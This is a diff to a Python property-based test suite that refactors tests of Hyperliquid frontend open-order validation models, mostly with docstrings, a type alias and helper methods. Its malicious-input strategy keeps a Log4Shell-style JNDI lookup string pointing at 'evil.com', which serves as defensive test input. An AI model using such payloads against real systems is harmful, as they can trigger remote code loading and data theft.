@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw frontend orders models.
 
 These tests validate critical security boundary models that process external frontend order data.
-The models tested here are essential for tracking and managing open orders displayed in frontend interfaces.
+The models tested here are essential for tracking and managing open orders in frontend interfaces.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious frontend order data that could manipulate order display and status
@@ -29,13 +29,21 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR FRONTEND ORDERS MODEL TESTING
 # =============================================================================
 
 
 def coin_strategy() -> SearchStrategy[str]:
-    """Generate valid coin/asset strings for frontend orders."""
+    """Generate valid coin/asset strings for frontend orders.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -75,7 +83,11 @@ def coin_strategy() -> SearchStrategy[str]:
 
 
 def decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for price and size fields."""
+    """Generate valid decimal strings for price and size fields.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Normal decimal values
         st.decimals(
@@ -100,22 +112,38 @@ def decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def order_id_strategy() -> SearchStrategy[int]:
-    """Generate valid order IDs."""
+    """Generate valid order IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def order_type_strategy() -> SearchStrategy[str]:
-    """Generate valid order types."""
+    """Generate valid order types.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["Limit", "Market", "Stop", "StopLimit", "TakeProfit"])
 
 
 def side_strategy() -> SearchStrategy[str]:
-    """Generate valid order sides."""
+    """Generate valid order sides.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["A", "B"])  # A = Ask (Sell), B = Bid (Buy)
 
 
 def trigger_condition_strategy() -> SearchStrategy[str]:
-    """Generate valid trigger conditions."""
+    """Generate valid trigger conditions.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.just("N/A"),  # Most common for non-trigger orders
         st.just(">="),
@@ -127,13 +155,21 @@ def trigger_condition_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 @st.composite
 def valid_frontend_order_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid frontend order data."""
+    """Generate valid frontend order data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "coin": draw(coin_strategy()),
         "isPositionTpsl": draw(st.booleans()),
@@ -151,8 +187,12 @@ def valid_frontend_order_data(draw: DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_frontend_order_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for frontend order security testing."""
+def malicious_frontend_order_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for frontend order security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Frontend order manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orders}"),
@@ -209,7 +249,7 @@ class TestHyperliquidRawFrontendOpenOrderProperties:
 
     @given(order_data=valid_frontend_order_data())
     def test_frontend_order_validation_success_properties(self, order_data: dict[str, Any]) -> None:
-        """Property: Valid frontend order data should always create valid HyperliquidRawFrontendOpenOrder objects."""
+        """Property: Valid order data should create valid frontend open order."""
         # Skip invalid data
         try:
             # Validate coin field
@@ -286,10 +326,10 @@ class TestHyperliquidRawFrontendOpenOrderProperties:
         malicious_value=malicious_frontend_order_strategy(),
     )
     def test_frontend_order_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Frontend order model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Frontend order model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "coin": "BTC",
             "isPositionTpsl": False,
             "isTrigger": False,
@@ -583,6 +623,60 @@ class TestHyperliquidRawFrontendOpenOrderProperties:
 class TestHyperliquidRawFrontendOrderIntegrationProperties:
     """Integration property tests for frontend order models working together."""
 
+    def _is_valid_order_data(self, order_data: dict[str, Any]) -> bool:
+        """Check if order data has valid basic structure.
+
+        Returns:
+            bool: True if order data structure is valid.
+        """
+        if not (isinstance(order_data["coin"], str) and order_data["coin"].strip()):
+            return False
+        if not (isinstance(order_data["oid"], int) and order_data["oid"] >= 0):
+            return False
+        if order_data["side"] not in ["A", "B"]:
+            return False
+        return order_data["orderType"] in [
+            "Limit",
+            "Market",
+            "Stop",
+            "StopLimit",
+            "TakeProfit",
+        ]
+
+    def _validate_order_independence(
+        self, valid_orders: list[HyperliquidRawFrontendOpenOrder]
+    ) -> None:
+        """Validate that orders maintain independence from each other."""
+        for i, order in enumerate(valid_orders):
+            assert isinstance(order.coin, str)
+            assert isinstance(order.oid, int)
+            assert order.side in ["A", "B"]
+
+            for j, other_order in enumerate(valid_orders):
+                if i != j:
+                    assert isinstance(other_order.coin, str)
+                    assert isinstance(other_order.oid, int)
+
+    def _test_malicious_injection(self, malicious_value: MaliciousInput) -> None:
+        """Test that malicious values are properly rejected."""
+        corrupted_data = {
+            "coin": "BTC",
+            "isPositionTpsl": False,
+            "isTrigger": False,
+            "limitPx": "29792.0",
+            "oid": malicious_value,
+            "orderType": "Limit",
+            "origSz": "5.0",
+            "reduceOnly": False,
+            "side": "A",
+            "sz": "5.0",
+            "timestamp": 1681247412573,
+            "triggerCondition": "N/A",
+            "triggerPx": "0.0",
+        }
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawFrontendOpenOrder.model_validate(corrupted_data)
+
     @given(
         orders=st.lists(
             valid_frontend_order_data(),
@@ -592,66 +686,24 @@ class TestHyperliquidRawFrontendOrderIntegrationProperties:
         malicious_value=malicious_frontend_order_strategy(),
     )
     def test_frontend_order_batch_processing_properties(
-        self, orders: list[dict[str, Any]], malicious_value: Any
+        self, orders: list[dict[str, Any]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple frontend orders should be processed independently."""
         valid_orders = []
 
         for order_data in orders:
-            # Skip invalid orders
             try:
-                if not (isinstance(order_data["coin"], str) and order_data["coin"].strip()):
+                if not self._is_valid_order_data(order_data):
                     continue
-                if not (isinstance(order_data["oid"], int) and order_data["oid"] >= 0):
-                    continue
-                if order_data["side"] not in ["A", "B"]:
-                    continue
-                if order_data["orderType"] not in [
-                    "Limit",
-                    "Market",
-                    "Stop",
-                    "StopLimit",
-                    "TakeProfit",
-                ]:
-                    continue
-
                 order = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
                 valid_orders.append(order)
             except (ValidationError, ValueError, TypeError, KeyError):
                 continue
 
-        # Property: Each order should maintain its individual values
-        for i, order in enumerate(valid_orders):
-            assert isinstance(order.coin, str)
-            assert isinstance(order.oid, int)
-            assert order.side in ["A", "B"]
+        self._validate_order_independence(valid_orders)
 
-            # Property: Orders should not affect each other
-            for j, other_order in enumerate(valid_orders):
-                if i != j:
-                    # Each order is independent
-                    assert isinstance(other_order.coin, str)
-                    assert isinstance(other_order.oid, int)
-
-        # Property: Malicious value should be rejected when injected
         if valid_orders:
-            corrupted_data = {
-                "coin": "BTC",
-                "isPositionTpsl": False,
-                "isTrigger": False,
-                "limitPx": "29792.0",
-                "oid": malicious_value,  # Inject malicious value
-                "orderType": "Limit",
-                "origSz": "5.0",
-                "reduceOnly": False,
-                "side": "A",
-                "sz": "5.0",
-                "timestamp": 1681247412573,
-                "triggerCondition": "N/A",
-                "triggerPx": "0.0",
-            }
-            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
-                HyperliquidRawFrontendOpenOrder.model_validate(corrupted_data)
+            self._test_malicious_injection(malicious_value)
 
     @given(
         complete_malicious_data=st.dictionaries(
@@ -678,7 +730,7 @@ class TestHyperliquidRawFrontendOrderIntegrationProperties:
     def test_frontend_order_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: Frontend order model should safely handle complete adversarial input."""
+        """Property: Frontend order model should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawFrontendOpenOrder.model_validate(complete_malicious_data)
